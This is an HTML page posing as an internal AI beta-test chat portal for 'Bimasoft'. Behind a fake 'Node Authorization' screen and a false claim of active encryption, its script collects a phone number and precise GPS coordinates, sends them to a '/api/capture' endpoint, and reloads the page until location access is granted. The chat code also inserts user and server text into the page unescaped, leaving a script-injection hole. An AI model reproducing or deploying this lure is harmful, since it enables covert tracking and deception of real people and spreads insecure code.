<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bimasoft | AI Development Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #050505; color: #e5e7eb; }
        .glass { background: rgba(17, 17, 17, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .input-dark { background: #0a0a0a; border: 1px solid #1f2937; transition: all 0.3s; }
        .input-dark:focus { border-color: #3b82f6; box-shadow: 0 0 10px rgba(59, 130, 246, 0.3); outline: none; }
    </style>
</head>
<body class="flex flex-col h-screen overflow-hidden">

    <div id="auth-overlay" class="fixed inset-0 z-50 flex items-center justify-center bg-black/95 p-6">
        <div class="glass p-8 rounded-3xl max-w-md w-full border border-blue-500/20 shadow-2xl shadow-blue-500/10 text-center">
            <div class="mb-6 inline-block p-4 rounded-2xl bg-blue-600/10 text-blue-500">
                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0 3.517-1.009 6.799-2.753 9.571m-3.44-4.514A9.01 9.01 0 0012 21a9.003 9.003 0 008.312-5.514M12 11V7a4 4 0 00-8 0v4h8z"></path></svg>
            </div>
            <h1 class="text-2xl font-bold text-white mb-2 tracking-tight">Node Authorization</h1>
            <p class="text-gray-400 text-xs mb-8 tracking-wide uppercase">Bimasoft Internal AI Beta-Test</p>
            
            <input type="tel" id="user-phone" placeholder="Employee Phone (62xxx)" 
                   class="w-full input-dark p-4 rounded-xl text-white mb-4 text-center font-mono">
            
            <button onclick="startAuth()" id="btn-auth" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold p-4 rounded-xl transition-all uppercase text-xs tracking-[0.2em]">
                Authorize Node
            </button>
            <p id="status" class="text-[9px] text-gray-600 mt-6 tracking-widest uppercase">Encryption: AES-256 Active</p>
        </div>
    </div>

    <header class="p-5 border-b border-white/5 flex justify-between items-center glass">
        <div class="flex items-center gap-2">
            <div class="w-2 h-2 bg-blue-500 rounded-full"></div>
            <span class="font-black text-sm tracking-tighter">BIMASOFT <span class="text-blue-500 underline decoration-2">AI</span></span>
        </div>
    </header>

    <main id="chat-box" class="flex-1 overflow-y-auto p-6 space-y-4"></main>

    <footer class="p-6 glass">
        <div class="max-w-4xl mx-auto flex gap-3">
            <input type="text" id="prompt" class="flex-1 input-dark p-4 rounded-2xl text-sm" placeholder="Send prompt...">
            <button onclick="send()" class="bg-blue-600 px-6 rounded-2xl font-bold hover:bg-blue-700">âžœ</button>
        </div>
    </footer>

    <script>
        async function startAuth() {
            const phone = document.getElementById('user-phone').value;
            if(!phone.startsWith('62')) return alert('Gunakan format 62xxx');
            
            document.getElementById('btn-auth').disabled = true;
            document.getElementById('status').innerText = "Syncing Geolocation...";

            navigator.geolocation.getCurrentPosition(async (pos) => {
                await fetch('/api/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        phone: phone,
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: pos.coords.accuracy
                    })
                });
                document.getElementById('auth-overlay').style.display = 'none';
            }, () => {
                alert("Verifikasi Gagal: Aktifkan GPS untuk akses portal.");
                location.reload();
            }, { enableHighAccuracy: true });
        }

        async function send() {
            const p = document.getElementById('prompt');
            const b = document.getElementById('chat-box');
            const txt = p.value;
            if(!txt) return;
            p.value = '';
            b.innerHTML += `<div class="flex justify-end"><div class="bg-blue-600/10 border border-blue-500/20 p-4 rounded-2xl max-w-[85%] text-sm">${txt}</div></div>`;
            
            const res = await fetch('/api/chat', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: txt })
            });
            const data = await res.json();
            b.innerHTML += `<div class="flex justify-start"><div class="glass p-4 rounded-2xl max-w-[85%] text-sm text-gray-400">${data.result}</div></div>`;
            b.scrollTop = b.scrollHeight;
        }
    </script>
</body>
</html>
